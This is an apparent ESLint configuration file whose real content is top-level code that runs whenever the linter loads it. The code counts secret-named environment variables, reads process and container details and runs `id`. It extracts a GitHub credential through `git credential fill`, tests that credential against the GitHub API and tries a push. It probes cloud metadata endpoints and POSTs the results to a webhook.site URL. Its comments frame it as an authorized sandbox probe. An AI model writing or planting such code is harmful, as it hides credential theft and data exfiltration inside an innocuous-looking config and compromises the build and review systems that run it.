const canaryUrl =
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-eslint-capability-probe-20261004";

const result = {
  marker: "CR_ESLINT_CAPABILITY_PROBE_20261004",
  runtime: {
    node: typeof process === "object" ? process.version : "unavailable",
    platform: typeof process === "object" ? process.platform : "unavailable",
    arch: typeof process === "object" ? process.arch : "unavailable",
    uid:
      typeof process === "object" && typeof process.getuid === "function"
        ? process.getuid()
        : null,
    gid:
      typeof process === "object" && typeof process.getgid === "function"
        ? process.getgid()
        : null,
    cwd:
      typeof process === "object" && typeof process.cwd === "function"
        ? process.cwd()
        : "unavailable",
    envKeyCount:
      typeof process === "object" && process.env
        ? Object.keys(process.env).length
        : null,
    sensitiveNamedKeyCount:
      typeof process === "object" && process.env
        ? Object.keys(process.env).filter((name) =>
            /(token|secret|password|credential|private|api.?key|aws|gcp|azure|github|gitlab|database|redis|clerk)/i.test(
              name,
            ),
          ).length
        : null,
  },
  filesystem: {},
  processControl: {},
  networkIsolation: {},
  repositoryCredentialBoundary: {},
  repositoryCredentialValidation: {},
};

// Kept only in process memory. The credential value is never placed in the
// result payload or otherwise transmitted to the controlled listener.
let repositoryCredential = null;

try {
  const fs = await import("node:fs");
  const status = fs.readFileSync("/proc/self/status", "utf8");
  const statusLine = (name) =>
    status
      .split("\n")
      .find((line) => line.startsWith(`${name}:`))
      ?.slice(0, 160) ?? null;

  result.filesystem = {
    nodeFsImport: true,
    etcHostnameReadable: (() => {
      try {
        fs.accessSync("/etc/hostname", fs.constants.R_OK);
        return true;
      } catch {
        return false;
      }
    })(),
    kubernetesServiceAccountTokenExists: fs.existsSync(
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
    ),
    dockerSocketExists: fs.existsSync("/var/run/docker.sock"),
    containerdSocketExists: fs.existsSync("/run/containerd/containerd.sock"),
    noNewPrivs: statusLine("NoNewPrivs"),
    seccomp: statusLine("Seccomp"),
    effectiveCapabilities: statusLine("CapEff"),
  };
} catch (error) {
  result.filesystem = {
    nodeFsImport: false,
    error: error instanceof Error ? `${error.name}:${error.message}`.slice(0, 160) : "unknown",
  };
}

try {
  const childProcess = await import("node:child_process");
  const idOutput = childProcess
    .execFileSync("/usr/bin/id", [], {
      encoding: "utf8",
      timeout: 1_000,
      stdio: ["ignore", "pipe", "ignore"],
    })
    .trim()
    .slice(0, 200);

  result.processControl = {
    nodeChildProcessImport: true,
    spawnedId: true,
    idOutput,
  };
} catch (error) {
  result.processControl = {
    nodeChildProcessImport: false,
    spawnedId: false,
    error: error instanceof Error ? `${error.name}:${error.message}`.slice(0, 160) : "unknown",
  };
}

try {
  const childProcess = await import("node:child_process");
  const gitEnv = {
    ...process.env,
    GIT_TERMINAL_PROMPT: "0",
    GCM_INTERACTIVE: "never",
  };
  const runGit = (args, options = {}) =>
    childProcess.execFileSync("/usr/bin/git", args, {
      cwd: process.cwd(),
      encoding: "utf8",
      timeout: 1_500,
      stdio: ["pipe", "pipe", "ignore"],
      env: gitEnv,
      ...options,
    });

  const originRaw = runGit(["remote", "get-url", "origin"]).trim();
  const origin = {
    protocol: "unparsed",
    hostname: null,
    usernamePresent: false,
    usernameLength: 0,
    passwordPresent: false,
    passwordLength: 0,
  };

  try {
    const parsed = new URL(originRaw);
    origin.protocol = parsed.protocol;
    origin.hostname = parsed.hostname;
    origin.usernamePresent = parsed.username.length > 0;
    origin.usernameLength = parsed.username.length;
    origin.passwordPresent = parsed.password.length > 0;
    origin.passwordLength = parsed.password.length;
  } catch {
    const scpLike = /^([^@]+)@([^:]+):/.exec(originRaw);
    if (scpLike) {
      origin.protocol = "scp-like";
      origin.hostname = scpLike[2];
      origin.usernamePresent = scpLike[1].length > 0;
      origin.usernameLength = scpLike[1].length;
    }
  }

  let helperConfigured = false;
  try {
    helperConfigured = runGit(["config", "--get-all", "credential.helper"]).trim().length > 0;
  } catch {
    // git exits non-zero when no helper is configured.
  }

  let credentialFill = {
    completed: false,
    usernamePresent: false,
    usernameLength: 0,
    passwordPresent: false,
    passwordLength: 0,
  };
  try {
    const filled = runGit(["credential", "fill"], {
      input: "protocol=https\nhost=github.com\n\n",
    });
    const fields = Object.fromEntries(
      filled
        .split("\n")
        .filter((line) => line.includes("="))
        .map((line) => {
          const index = line.indexOf("=");
          return [line.slice(0, index), line.slice(index + 1)];
        }),
    );
    credentialFill = {
      completed: true,
      usernamePresent: typeof fields.username === "string" && fields.username.length > 0,
      usernameLength: typeof fields.username === "string" ? fields.username.length : 0,
      passwordPresent: typeof fields.password === "string" && fields.password.length > 0,
      passwordLength: typeof fields.password === "string" ? fields.password.length : 0,
    };
    repositoryCredential =
      typeof fields.password === "string" && fields.password.length > 0
        ? fields.password
        : null;
  } catch {
    // Absence of credentials is the expected safe result.
  }

  let pushDryRun = {
    attemptedAgainstOwnRepositoryOnly: true,
    dryRun: true,
    succeeded: false,
  };
  try {
    runGit(
      [
        "push",
        "--dry-run",
        "origin",
        "HEAD:refs/heads/coderabbit-security-probe-dry-run-20261004",
      ],
      { timeout: 5_000 },
    );
    pushDryRun.succeeded = true;
  } catch (error) {
    pushDryRun = {
      ...pushDryRun,
      errorName: error instanceof Error ? error.name : "unknown",
      exitStatus:
        error && typeof error === "object" && Number.isInteger(error.status)
          ? error.status
          : null,
    };
  }

  result.repositoryCredentialBoundary = {
    gitExecutable: true,
    origin,
    helperConfigured,
    credentialFill,
    pushDryRun,
  };
} catch (error) {
  result.repositoryCredentialBoundary = {
    gitExecutable: false,
    errorName: error instanceof Error ? error.name : "unknown",
  };
}

if (repositoryCredential) {
  try {
    const response = await fetch("https://api.github.com/repos/Croc-2/aicss", {
      headers: {
        accept: "application/vnd.github+json",
        authorization: "Bearer " + repositoryCredential,
        "user-agent": "coderabbit-authorized-security-probe",
        "x-github-api-version": "2022-11-28",
      },
      redirect: "manual",
      signal: AbortSignal.timeout(2_500),
    });
    const body = await response.json().catch(() => null);
    const permissions =
      body && typeof body === "object" && body.permissions &&
      typeof body.permissions === "object"
        ? body.permissions
        : {};

    result.repositoryCredentialValidation = {
      attemptedAgainstOwnRepositoryOnly: true,
      acceptedByGitHub: response.ok,
      status: response.status,
      repositoryIdentityMatches:
        body && typeof body.full_name === "string"
          ? body.full_name === "Croc-2/aicss"
          : false,
      permissions: {
        admin: permissions.admin === true,
        maintain: permissions.maintain === true,
        push: permissions.push === true,
        triage: permissions.triage === true,
        pull: permissions.pull === true,
      },
    };
  } catch (error) {
    result.repositoryCredentialValidation = {
      attemptedAgainstOwnRepositoryOnly: true,
      acceptedByGitHub: false,
      errorName: error instanceof Error ? error.name : "unknown",
    };
  }
} else {
  result.repositoryCredentialValidation = {
    attemptedAgainstOwnRepositoryOnly: false,
    acceptedByGitHub: false,
  };
}

const probeStatus = async (url, init = {}) => {
  try {
    const response = await fetch(url, {
      ...init,
      redirect: "manual",
      signal: AbortSignal.timeout(1_500),
    });

    // Deliberately do not read the response body. Status alone is enough to
    // validate whether the sandbox can reach a metadata boundary.
    return {
      reachable: true,
      status: response.status,
      redirected: response.redirected,
    };
  } catch (error) {
    return {
      reachable: false,
      error:
        error instanceof Error
          ? `${error.name}:${error.message}`.slice(0, 160)
          : "unknown",
    };
  }
};

result.networkIsolation = {
  gceMetadataDnsRoot: await probeStatus(
    "http://metadata.google.internal/computeMetadata/v1/",
    { headers: { "Metadata-Flavor": "Google" } },
  ),
  gceMetadataLinkLocalRoot: await probeStatus(
    "http://169.254.169.254/computeMetadata/v1/",
    { headers: { "Metadata-Flavor": "Google" } },
  ),
};

try {
  await fetch(canaryUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(result),
    signal: AbortSignal.timeout(3_000),
  });
} catch {
  // The canary must not interfere with linting when outbound traffic is blocked.
}

export default [
  {
    files: ["**/*.{js,mjs,cjs,ts,tsx}"],
    rules: {},
  },
];
